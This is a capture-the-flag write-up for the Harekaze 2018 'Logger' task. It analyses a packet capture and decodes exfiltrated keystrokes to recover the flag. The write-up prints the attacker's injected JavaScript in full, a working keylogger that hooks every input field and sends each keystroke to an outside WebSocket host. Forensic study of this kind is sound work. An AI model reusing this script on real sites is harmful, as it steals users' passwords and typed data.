# Logger – *Write-up by @terjanq*

> Description  
>---  
> Someone stole my password … (´・ω・｀)  
> - [logger.pcap]  
>  
> (Rev + Net, 200 points)

### Prolog  
In the task we are provided with only one file [logger.pcap] and with the
hint: _Someone stole my password_ ...

`.pcap` is a packet capture extension. To read it I used the popular tool:
`Wireshark`

### Packets  
First thing I was searching for in the given logs, were `HTTP` packets. I
quickly noticed `POST requests` to `/login.php` which showed the login
credentials.

![credentials]

We see that there are parameters: `username`, `cnonce` and `hash`, but no
`password` given. The existence of `hash` argument indicates that  `javascript
code` had to be used. And indeed there is [bundle.js] file provided as a
response of the `GET /dist/bundle.js` request.

![packets]

There is another interesting packet `HTTP/1.1 101 Switching Protocols` which
indicates that `WebSocket tunnel` has started.

### Javascript

As mentioned earlier I fetched the [bundle.js] and the first thing I have
tried was to search for part of the code where `hash` is calculated.

```js  
function(e, t) {  
   function i(t) {  
       return e.createHash("sha256").update(t).digest("hex");  
   }  
   var r = n(162);  
   n.n(r);  
   t(function() {  
       t("#submit").on("click", function() { var e = t("input#username").val(),  
       n = t("input#password").val(),  
       r = t("input#nonce").val(),  
       o = Math.random() + "",  
       a = i(i(n) + ":" + r + ":" + o);   
       return t.post("login.php", { username: e, cnonce: o, hash: a },   
           function(e) { e.error ? t("input#nonce").val(e.nonce) : location.reload(!0) }), !1 })   
   })  
}.call(t, n(72), n(70))  
```

It can be seen, that in order to calculate the `hash` I need to know:
`password`, `nonce` and `cnonce`, but from these three only last two are
known. By looking at the `function i()` I assume that the function creates a
valid, not vulnerable `SHA256` hash.  
As the result of this assumption, I have remembered about `WebSocket protocol`
I noticed before and quickly searched for `WebSocket` word in the source code.

### Websocket

After some formatting, I get the injected by an attacker code ([injected.js])
which looks like following:

```js  
window.addEventListener("DOMContentLoaded", function() {

 function encode(msg, key) {  
   var encoded_arr = [];  
   if (typeof s === "string") msg = (new TextEncoder("utf-8")).encode(msg);  
   var i=0, z;  
   for (;i < msg.length;i++) if(msg[i]) break;  
   z = i;  
   for (;i < msg.length;i++) {  
     var c = msg[i], j = 0;  
     for (;j in encoded_arr || c;j++) {  
       if (encoded_arr[j]) c += encoded_arr[j] * 256;  
       encoded_arr[j] = c % 58;  
       c = Math.floor(c / 58);  
     }  
   }  
   return key[0].repeat(z) + encoded_arr.reverse().map(x => key[x]).join("");  
 }

 function hash(s) {  
   var r = 0, i=0;  
   for (;i < s.length;i++) r = r * 31 + s.charCodeAt(i) | 0;  
   return r;  
 }

 function rand(s) {  
   var x = 123456789, y=362436069, z=521288629, w = 88675123, t;  
   return function(a, b) {  
     t = x ^ x << 11;  
     x = y; y = z; z = w;  
     w = w ^ w >> 19 ^ (t ^ t >> 8);  
     if (a !== undefined && b !== undefined) {  
       return a + w % (b + 1 - a);  
     }  
     return w;  
   };  
 }

 function shuffle(a, r) {  
   var i;  
   i = a.length - 1;  
   for (;i > 0;i--) {  
     var j = Math.abs(r(0, i));  
     var t = a[i]; a[i] = a[j]; a[j] = t;  
   }  
 }

 var ws = new WebSocket("ws://192.168.99.101:7467");  
 var key = "MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp";  
 var key2 = key;

 ws.addEventListener("open", function(event) {  
   var message = navigator.userAgent;  
   ws.send(encode(message, key));  
   key2 = key.split("");  
   shuffle(key2, rand(hash(message)));  
   key2 = key2.join("");  
 });

 Array.from(document.getElementsByTagName("input")).forEach(function(e) {  
   e.addEventListener("keyup", function(v) {  
     ws.send(encode(Math.random().toString().slice(2) + " " + v.key, key2));  
   }, false);  
 });

}, false);

```

We can see that communication *client-server* is encoded
(`ws.send(encode(message, key))`) using two keys `key` and `key2`. Initially,
our key is equal to
`MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp` and then after
some _shuffling_ it transforms to `key2`. Also, the first message sent via
`sockets` is just client's `User-Agent` value, which is also used to transform
the `key`.

`User-Agent` is not a secret, because we can easily fetch it from `HTTP
headers`.

> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

To confirm that encode function returns the same encoded message as unmasked
packet from `Wireshark` I evaluated `encode()` function with `User-Agent`
value as the message and
`MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp` as the key. As
expected, the trial has succeeded.

> WebSocket:
> T4N8jgYZ5ChvnMJyKyAPCvwAcAmjAhVLt12DeE6SXJQxKsXyv3HL2xKXgASRLHpkDDYRxYQVJt1rNGH6KxyWkkK2gQep84LG33j5N1fzFaxDeXmKfcargKYanYq66KKs9U2XTWEerSwBMCPbsj7faMHQzSkNH

By looking at functions `hash`, `rand` and `shuffle` we see that there is no
any randomization made or any desire of reversing them. So, I just use them to
generate they transformed key `key2`.

The attacker attached a *keylogger* on every input on the site, which is
sending each pressed by user key to external server as an encoded message in
form of `ws.send("{random} {input_key}", key2)`.

I searched for `WebSockets` packets in `Wireshark` and I noticed that there
are packets of three lengths: *~219*, *~60*, *~85*. First ones are encoded
`User-Agent messages`, second - `pings` and the last ones are the ones I need
- `user input`.

![websocket]

I dumped those packets into [sockets.txt]

### Decoding

In order to solve the task, we would like to decode at least the last
character of the message. As mentioned already, we don't need to reverse
anything except the function `encode(msg, key)`. Let's have a closer look at
it with removing unused parts.

```js  
function encode(msg, key) {  
   var encoded_arr = [];  
   msg = (new TextEncoder("utf-8")).encode( msg );

   for (var i = 0; i < msg.length; i++) {  
       var c = msg[ i ];  
       for (var j = 0; j in encoded_arr || c; j++) {  
           if (encoded_arr[ j ]) {   
               c += encoded_arr[ j ] * 256   
           }   
           encoded_arr[ j ] = c % 58;  
           c = Math.floor( c / 58 )  
       }  
   }

   return encoded_arr.reverse().map( x => key[x] ).join("")  
}  
```

After decent analyze of the function I came to the following conclusions:  
- each `element` of `encoded_arr` is between [0, 58)  
- `msg` is converted to `Uint8Array` so its value is between [0, 255]  
- `key` is of length 58 and is used only as a dictionary in return function  
- each letter of `msg` is used as the transofrmation seed of `encoded_arr`

These observations pushed me to the solution of reversing this function by
brute-forcing all the possible seeds and all the possible transformations.

Reversing `return encoded_arr.reverse().map( x => key[x] ).join("")` is quite
easy, since it just replaces each character of reversed `encoded_arr` with
corresponding character in dictionary `key[]`. The reversion of the code can
be done by  `encoded_arr.split("").map( x => key.indexOf(x) ).reverse()`

To fetch the last character of the word we have to solve the equation:  
```  
c = seed  
c0 = c + prev_encoded_arr[0] * 256  
encoded_arr[0] == c0 % 58  
```  
where we only know `encoded_arr[0]`, and the `seed` is the searched character
of  `msg`

### Solution

It has to be said, that there will be a lot of solutions `(c,
prev_encoded_arr[0])`, so we should repeat the process deep enough for
succeeding elements of `prev_encoded_arr[]` and our solutions will quickly zip
into one-way solution.

In my initial solution, I had used a simple recursive function with deep of
10, and it was enough to solve the task.

```js  
var fetched_char = "", result = "";  
function helper(i, c, encoded_arr, c0){  
   if( i == 10 ) {  
       fetched_char = String.fromCharCode( c );  
       return;  
   }

   for(var r0 = 0; r0 < 58; r0++){  
       c0 += r0*256;  
       if(encoded_arr[ i ] == c0 % 58){  
           helper(i + 1, c, encoded_arr, Math.floor( c0 / 58 ));  
       }  
   }  
}  
function decode(encoded_arr, key){  
   encoded_arr = encoded_arr.split("");  
   encoded_arr = encoded_arr.map( x => key.indexOf(x) ).reverse();

   for(var c = 0; c < 256; c++){  
       helper(0, c, encoded_arr, c)  
   }  
   return fetched_char;  
}  
for(var packet of packets){  
   result = decode(packet, key2) + result;  
}  
console.log(result);  
```  
The only issue of this solution was, that not every character is of length 1
(e.g. `Shift`), and the recieved text contained unwanted `t` characters:
`irizaki_tmeibuteute_tdamashiilaeHtarekazeCTF{t7r1663r_th4ppy_t61rl}t `.  
It wasn't too hard to remove them though and the final flag was:
**HarekazeCTF{7r1663r_h4ppy_61rl}**

However this is the simplest solution I can think of, and after the
competition ended I've improved the code of [decoder.js] and decoded the whole
strings, which are as follows :)

![decoded]

The complete improved solution is included in [decoder.html]

```js  
function encode(msg, key) {  
   var encoded_arr = [];  
   msg = (new TextEncoder("utf-8")).encode( msg );

   for (var i = 0; i < msg.length; i++) {  
       var c = msg[ i ];  
       for (var j = 0; j in encoded_arr || c; j++) {  
           if (encoded_arr[ j ]) {   
               c += encoded_arr[ j ] * 256   
           }   
           encoded_arr[ j ] = c % 58;  
           c = Math.floor( c / 58 )  
       }  
   }

   return encoded_arr.reverse().map( x => key[x] ).join("")  
}

function helper(i, c, encoded_arr, c0, cb){  
   if(i == encoded_arr.length) {  
       if(c0 == 0){  
           this.solved = true;  
           cb(String.fromCharCode( c ));  
       }  
       return;  
   }  
   if(i == 0) this.solved = false;  
  
   for(var r0 = 0; r0 < 58; r0++){  
       var orig_r0 = encoded_arr[ i ];  
       if( this.solved ) return;  
       if( encoded_arr[ i ] == (c0 + r0*256) % 58 ){  
           encoded_arr[ i ] = r0;  
           helper(i + 1, c, encoded_arr, Math.floor( ( c0 + r0*256 ) / 58), cb );  
           if( this.solved ) return;  
           encoded_arr[ i ] = orig_r0;  
       }  
   }  
}

Array.prototype.back = function(){  
   return this[this.length - 1];  
};

function decode(encoded_arr, key){  
   encoded_arr = encoded_arr.split("");  
   encoded_arr= encoded_arr.map( x => key.indexOf(x) ).reverse();

   var result = "";  
   var callback = (x) => result += x;

   while(encoded_arr.length){  
       for(var c = 0; c < 256; c++)  
           helper(0, c, encoded_arr, c, callback);  
       while( encoded_arr.length && !encoded_arr.back() ) encoded_arr.pop();  
   }

   return result.split("").reverse().join("");  
}

function hash(s) {  
   var r = 0, i=0;  
   for (;i < s.length;i++) r = r * 31 + s.charCodeAt(i) | 0;  
   return r;  
 }

function rand(s) {  
   var x = 123456789, y=362436069, z=521288629, w = 88675123, t;  
   return function(a, b) {  
     t = x ^ x << 11;  
     x = y; y = z; z = w;  
     w = w ^ w >> 19 ^ (t ^ t >> 8);  
     if (a !== undefined && b !== undefined) {  
       return a + w % (b + 1 - a);  
     }  
     return w;  
   };  
 }

function shuffle(a, r) {  
   var i;  
   i = a.length - 1;  
   for (;i > 0;i--) {  
     var j = Math.abs(r(0, i));  
     var t = a[i]; a[i] = a[j]; a[j] = t;  
   }  
 }

var console_code = document.querySelector('#console');  
var _console = console.log  
console.log = function(...args){  
   if( console_code )  
       console_code.innerHTML += args.join(" ") + "\n";  
   _console(...args);  
}

var packets =
['iCmUsu3sWAgt1DLDTPiCsMkiJ','iTS5kqhhN6dZgQfzeXgG7yYr5','uKGMC4ZpKpR1Hbek9LnoWag','MENtnhfQx47g2MD4YfaPpapNRA','iBKoHeQsAyZ3yYg5uzbDpVBza','mez8Y8onREos36hbs1W3PrzEVyF','ioHr8fnSqtoRvLkvW6z6YoZLQ','iBKN3429YfCEmRAxT6f9g9Qsv','yvDepd8vhnp8MQNeYfiBKg2L5apQCZ','iDM2FWZnm2fnpYmYGmqVWex27','iDyQ3jA179gqDNzj51e8SzqfP','iDRMoK3vV8dwipy12npBHDCx6','RoAaJ29cybX87mddDKDJdDEw3ZGE29','iDVvjasQqyiaf7vKnNixERsNP','iBz2L9ZX6LUyopeooorQDnwYi','MEBmf8UBvosB98ocQawh9XZ45n','iM4zg74tACAR4XB7khRmL5gLC','iCATz5TGy5jcsCLGWawZSc8zc','iyvVZ3Q5xAVGy1ZLXZFdnXTep','iDS5YadHVaegKNDjYJkamNM8a','yvrGR54rYJj19e75eo1TACqEAuGfow','ioPy4npLFrivepDY4MioMARxZ','iBwMxi5246Xg7UQi2yvJQ8Xg6','iyvVWzDwMaVPLaZYQ2y975QT6','4VXm8RKGEgG95iKCXam1ygN','M77CEgVf6os6K6tjN1M6A9y7pn','MVeeCjRXYXcKdAgCxKFTJgAdZo','meFcfCq8k1CzkESo7i4GDRnhx9n','iyvkbgC3k9R7JTPUESdmeZfzn','oY9P5XbTFsaV4sS2CHBJE3hcYZTQvurTr','iEEhZ5DXWedXQ4iUQbmwrGrs3','dNUzs2v4Vf7U6GdArAhvCmdPtLH8WMviyq','iCAjd7zUWskbSy9RLYjtrZDCV','qPgGDYUvNuUT3Ch1fKgknFW4CPVcWgH','iShnuif7DhNDTetUZMXWG9rLJ','iDSiqPQnncdz6Rs6YGzmeWuqE','iC8FaVhXmb1GYXrCGw5CcuAXC','i7fBGggWJf9LNRdVprPLPpei3','i7fxmXUMpgst9kACHosb91Cka','MECvB5p81fNgVACMmJQsVd6cQB','iiDMtEVW7BUo5ocRRN4inXdQ7','iSEGbN9YJHTXWLQp2JRMcPmFp','iy9KSw2qYEeVA627cyZzH6F6U','iCN8mpZLH7uUp1fUADyGA5P95','MECbuHyU6L65iPw5Asw92EekYa','yvzJxXHW4XEPsncH4zSHDxVZf9tzxk','iBz2LgRNBBfq42MTaCV3wvjCR','iM5bfsw5xU93kTpig2Q4YmS7A','iBYgT3V51QMxRuxhUS1dSm6s2','ME8pn9tTKm3HEkhnFUeXyB7Wtd','iCN5jfUJiqBYWEbP3hhFgDfci','iDVWAJwuudMAi7x7CpNGARxA4','iMGUZeMFtyDcYf7qGpMHfsEvB','iCA3E5NsH2vMvZck9rexTLXG4','horZcydUns9SRFV8wefAJhEYWGwVfxrS','ME131HW8CbVfH26b1XpK6741Kk','iSEGaKaTXheBaHoAFgrF2ncaL','T6Kihw84sq6JnwNc1V6ps5','iDSNbdyahA2wUahbo5oaztjvm','iyvVWY7oECQ2PE3nLMW9ZcR1Q','iidqHMFJ5xshHM4XstWfXvHqJ','hiMU5F4R6qXdTWeiuwuL8so1qCDzsj4m','iC51H2btb9FywrKrgFCqcCUnA','iyvVZ8xTQrukCAiSe6Yrfogg4','i7qb1XR4yhPUzyK1y1k1M1kHH','iyducwzyZxJgeN11VjtYrPnrt','iBwageNmGH9F1Cx7gcK8nhPkC','yWzcku8Ed5ZYasGMqBNny8Cy8ue4hH'];

var key = "MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp";  
var msg = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36";

var key2 = key.split("");  
shuffle( key2, rand( hash(msg) ) );  
key2 = key2.join("")

window.onload = function(){  
   var result = ""  
   for( packet of packets ){  
       var decoded = decode(packet, key2);  
       if(/^\d+ .$/.test(decoded)) result += decoded[decoded.length - 1];  
       console.log(decoded);  
   }

   console.log("\n\nFlag: ", result, "\n\n");

   var kk = (encode(msg, key));

   console.log(`encoding: ${msg}\n\t${kk}\n`);  
   console.log("decoded: ", decode(kk, key));  
}f  
```

[websocket]: <./files/websocket.png>  
[packets]: <./files/packets.png>  
[sockets.txt]: <./sockets.txt>  
[logger.pcap]: <./files/logger.pcap>  
[decoded]: <./files/decoded.png>  
[credentials]: <./files/credentials.png>  
[bundle.js]: <./files/bundle.js>  
[injected.js]: <./injected.js>  
[decoder.js]: <./decoder.js>  
[decoder.html]: <./decoder.html>

Original writeup (https://github.com/terjanq/Flag-
Capture/tree/master/Harekaze2018/Logger#logger--write-up-by-terjanq).